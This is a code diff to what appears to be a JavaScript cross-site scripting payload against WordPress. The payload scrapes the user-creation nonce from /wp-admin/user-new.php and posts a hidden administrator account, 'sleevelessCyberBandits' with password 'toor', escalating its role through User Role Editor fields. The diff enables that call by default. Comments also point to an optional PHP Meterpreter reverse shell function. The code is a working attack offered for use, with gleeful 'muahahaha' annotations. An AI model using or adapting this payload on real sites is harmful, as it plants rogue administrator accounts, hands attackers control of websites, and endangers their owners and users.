@@ -65,50 +65,20 @@ function read_body(xhr)
 
 
 
-function sendAddUserPost(nonce)
+
+// Parse out the nonce value then pass to the add user function
+function addAdminUser()
 {
+	var uri = "/wp-admin/user-new.php";
+
 	// The following user will be added as an Administrator level user
-	var username  = "ishouldntbehere";
+	var username  = "sleevelessCyberBandits";
 	var email     = "advancedadmin%40bad.af"
 	var firstName = "trevor";
 	var lastName  = "roach";
 	var password  = "toor";
 
-	var uri       = "/wp-admin/user-new.php";
 
-	xhr = new XMLHttpRequest();
-	xhr.open("POST", uri);
-
- 	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
- 	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-	var body = "action=createuser&"
-	body += "_wpnonce_create-user=" + nonce + "&"; 
-	body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
-	body += "user_login=" + username + "&";
-	body += "email=" + email + "&";
-	body += "first_name=" + firstName + "&";
-	body += "last_name=" + lastName + "&";
-	body += "uri=&";
-	body += "pass1=" + password + "&";
-	body += "pass1-text=" + password + "&";
-	body += "pass2=" + password + "&";
-	body += "pw_weak=on&";
-	body += "send_user_notification=0&";
-	body += "role=subscriber&";
-	body += "ure_select_other_roles=administrator&"; // muahahahaha 
-	body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
-	body += "createuser=Add+New+User";
-
-	xhr.send(body);
-}
-
-
-// Parse out the nonce value then pass to the add user function
-function getNonceAndAddUser()
-{
-	// console.log("Starting getNonce...");
-	var uri = "/wp-admin/user-new.php";
 
 	xhr = new XMLHttpRequest();
 
@@ -122,10 +92,33 @@ function getNonceAndAddUser()
 		{
 			var response = read_body(xhr);
 			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
-		//	console.log("Nonce position: " + noncePos);
-
 			var nonceVal = response.substring(noncePos+35, noncePos+45);
-			sendAddUserPost(nonceVal);
+
+			xhr = new XMLHttpRequest();
+			xhr.open("POST", uri);
+
+ 			xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+ 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+			var body = "action=createuser&"
+			body += "_wpnonce_create-user=" + nonceVal + "&"; 
+			body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
+			body += "user_login=" + username + "&";
+			body += "email=" + email + "&";
+			body += "first_name=" + firstName + "&";
+			body += "last_name=" + lastName + "&";
+			body += "uri=&";
+			body += "pass1=" + password + "&";
+			body += "pass1-text=" + password + "&";
+			body += "pass2=" + password + "&";
+			body += "pw_weak=on&";
+			body += "send_user_notification=0&";
+			body += "role=subscriber&";
+			body += "ure_select_other_roles=administrator&"; // muahahahaha 
+			body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
+			body += "createuser=Add+New+User";
+
+			xhr.send(body);
 		}
 	}
 }
@@ -602,7 +595,7 @@ function writeFile()
 
 // The user, password, permissions and such are defined in the function 
 // itself, make sure you adjust these values. 
-//getNonceAndAddUser();
+addAdminUser();
 
 
 
@@ -633,9 +626,4 @@ function writeFile()
 // multi/handler
 // payload is php/meterpreter/reverse_tcp
 //openPhpMeterpreterSession();
-
-
-// Prototypes for playing around
-//runCmd();
-//writeFile();
 
